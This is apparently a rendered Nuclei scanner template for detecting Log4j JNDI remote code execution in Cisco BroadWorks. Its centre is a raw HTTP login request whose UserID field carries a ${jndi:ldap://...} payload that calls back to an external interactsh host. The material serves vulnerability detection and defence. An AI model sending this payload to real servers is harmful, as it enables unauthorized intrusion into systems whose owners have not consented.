# Nuclei Template: Cisco BroadWorks - Remote Code Execution (Apache Log4j)
**Template ID:** cisco-broadworks-log4j-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`cisco-broadworks-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
Cisco BroadWorks is susceptible to Log4j JNDI remote code execution. Cisco BroadWorks is an enterprise-grade calling and collaboration platform delivering unmatched performance, security and scale.

## Steps to reproduce / Exploit Payload
```http
POST /commpilot/servlet/Login HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Referer: {{RootURL}}
Content-Type: application/x-www-form-urlencoded

domain={{str}}.com&UserID=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&EnteredUserID=a&Password=a
```

## References
- https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-log4j-qRuKNEbd
